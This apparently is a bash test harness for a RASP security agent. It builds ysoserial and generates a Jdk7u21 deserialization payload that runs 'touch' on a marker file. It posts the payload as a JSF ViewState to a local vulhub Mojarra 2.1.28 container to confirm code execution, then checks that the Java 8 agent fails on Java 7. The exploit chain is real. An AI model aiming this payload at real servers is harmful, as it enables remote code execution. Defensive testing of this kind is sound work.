#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_MOJARRA_IMAGE:-vulhub/mojarra:2.1.28}"
maven_jdk8_image="${OHMYRASP_MAVEN_JDK8_IMAGE:-maven:3.8.1-jdk-8}"
ysoserial_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
ysoserial_jar="${OHMYRASP_YSOSERIAL_JAR:-${ysoserial_dir}/ysoserial.jar}"
baseline_name="${OHMYRASP_VULHUB_MOJARRA_BASELINE_NAME:-ohmyrasp-vulhub-mojarra-viewstate-baseline}"
protected_name="${OHMYRASP_VULHUB_MOJARRA_PROTECTED_NAME:-ohmyrasp-vulhub-mojarra-viewstate-protected}"
baseline_port="${OHMYRASP_VULHUB_MOJARRA_BASELINE_PORT:-19494}"
protected_port="${OHMYRASP_VULHUB_MOJARRA_PROTECTED_PORT:-19495}"
success_file="${OHMYRASP_VULHUB_MOJARRA_SUCCESS_FILE:-/tmp/ohmyrasp-mojarra-viewstate-success}"
baseline_dir="logs/vulhub-mojarra-2.1.28-java7-baseline"
protected_dir="logs/vulhub-mojarra-2.1.28-java7-protected"
payload_dir="logs/vulhub-mojarra-2.1.28-java7-payload"
payload_file="${payload_dir}/viewstate.txt"

copy_logs() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_logs "$baseline_name" "$baseline_dir"
  copy_logs "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

prepare_ysoserial() {
  if [[ -s "$ysoserial_jar" ]]; then
    return
  fi
  if [[ -n "${OHMYRASP_YSOSERIAL_JAR:-}" ]]; then
    echo "ysoserial jar not found at ${ysoserial_jar}" >&2
    exit 1
  fi

  mkdir -p "$ysoserial_dir"
  rm -rf "${ysoserial_dir}/src"
  docker run --rm -v "${ysoserial_dir}:/work" -w /work "$maven_jdk8_image" \
    bash -lc 'git clone --depth 1 https://github.com/frohoff/ysoserial.git src && cd src && mvn -q -DskipTests package && cp target/ysoserial-*-all.jar /work/ysoserial.jar'
}

verify_image_java7() {
  docker run --rm --entrypoint java "$image" -version > "${payload_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq '1.7.0_21' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2
    echo "Mojarra image did not report the expected Java 7u21 runtime" >&2
    exit 1
  fi
}

write_payload() {
  local ysoserial_abs_dir
  local ysoserial_file
  local payload_abs_dir
  ysoserial_abs_dir="$(cd "$(dirname "$ysoserial_jar")" && pwd)"
  ysoserial_file="$(basename "$ysoserial_jar")"
  payload_abs_dir="$(cd "$payload_dir" && pwd)"

  docker run --rm \
    -v "${ysoserial_abs_dir}:/ysoserial:ro" \
    -v "${payload_abs_dir}:/payload" \
    -e "YSOSERIAL_FILE=${ysoserial_file}" \
    -e "SUCCESS_FILE=${success_file}" \
    -w /ysoserial \
    "$maven_jdk8_image" \
    bash -lc '/usr/local/openjdk-8/bin/java -jar "$YSOSERIAL_FILE" Jdk7u21 "touch ${SUCCESS_FILE}" | gzip | base64 -w 0 > /payload/viewstate.txt && test -s /payload/viewstate.txt'
}

start_mojarra() {
  local name="$1"
  local port="$2"
  shift 2
  docker run -d --name "$name" \
    -p "${port}:8080" \
    "$@" \
    "$image" >/dev/null
}

wait_for_http() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status

  for attempt in $(seq 1 120); do
    status="$(
      curl -sS --max-time 8 \
        -o "${dir}/ready-${attempt}.html" \
        -w '%{http_code}' \
        "http://127.0.0.1:${port}/" 2>"${dir}/ready-${attempt}.err" || true
    )"
    printf 'http_ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]] && grep -Fq 'javax.faces.ViewState' "${dir}/ready-${attempt}.html"; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "Mojarra container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "Mojarra did not expose the JSF demo page on ${port}" >&2
  exit 1
}

post_viewstate_payload() {
  local port="$1"
  local dir="$2"
  curl -sS --max-time 30 \
    -o "${dir}/attack.response" \
    -w '%{http_code}' \
    -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'j_idt6=j_idt6' \
    --data-urlencode 'j_idt6:j_idt7=' \
    --data-urlencode 'j_idt6:j_idt8=Hello' \
    --data-urlencode "javax.faces.ViewState@${payload_file}" \
    "http://127.0.0.1:${port}/index.xhtml" || true
}

run_baseline() {
  start_mojarra "$baseline_name" "$baseline_port"
  wait_for_http "$baseline_name" "$baseline_port" "$baseline_dir"

  docker exec "$baseline_name" rm -f "$success_file"
  local attack_status
  attack_status="$(post_viewstate_payload "$baseline_port" "$baseline_dir")"
  printf 'attack_status=%s\n' "$attack_status" >> "${baseline_dir}/attempts.log"

  if ! docker exec "$baseline_name" sh -c "test -e '${success_file}'"; then
    sed -n '1,180p' "${baseline_dir}/attack.response" >&2 || true
    docker logs "$baseline_name" >&2 || true
    echo "baseline Mojarra ViewState payload did not create ${success_file}" >&2
    exit 1
  fi
  printf 'viewstate_marker=present\n' >> "${baseline_dir}/attempts.log"

  copy_logs "$baseline_name" "$baseline_dir"
  docker rm -f "$baseline_name" >/dev/null 2>&1 || true
}

run_protected_boundary() {
  start_mojarra "$protected_name" "$protected_port" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true"

  sleep 4
  copy_logs "$protected_name" "$protected_dir"
  if ! grep -Fq 'Unsupported major.minor version 52.0' "${protected_dir}/container.log"; then
    sed -n '1,160p' "${protected_dir}/container.log" >&2 || true
    echo "Mojarra Java 7 protected probe did not show Java 8 agent class-version mismatch" >&2
    exit 1
  fi
  if docker ps --filter "name=${protected_name}" --filter status=running --format '{{.Names}}' \
    | grep -Fq "$protected_name"; then
    echo "Mojarra Java 7 container unexpectedly kept running with Java 8 agent" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
chmod 777 "$protected_dir"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

prepare_ysoserial
verify_image_java7
write_payload
run_baseline
run_protected_boundary

echo "vulhub Mojarra JSF ViewState Java7 legacy boundary passed"
